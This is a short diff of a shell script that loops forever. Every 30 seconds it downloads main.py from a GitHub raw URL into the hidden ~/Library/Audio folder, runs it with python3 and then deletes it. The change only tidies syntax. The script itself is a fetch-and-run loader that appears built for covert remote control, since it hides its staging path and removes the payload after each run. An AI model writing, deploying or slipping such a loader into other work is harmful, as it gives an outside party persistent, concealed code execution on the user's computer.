@@ -1,13 +1,13 @@
 run() {
-    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/main.py >/Users/$USER/Library/Audio/main.py
+    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/main.py -o ~/Library/Audio/main.py
 
-    python3 /Users/$USER/Library/Audio/main.py
+    python3 ~/Library/Audio/main.py
 
-    rm /Users/$USER/Library/Audio/main.py
+    rm ~/Library/Audio/main.py
 }
 
 while true; do
     run
 
-    sleep "30s"
+    sleep 30
 done
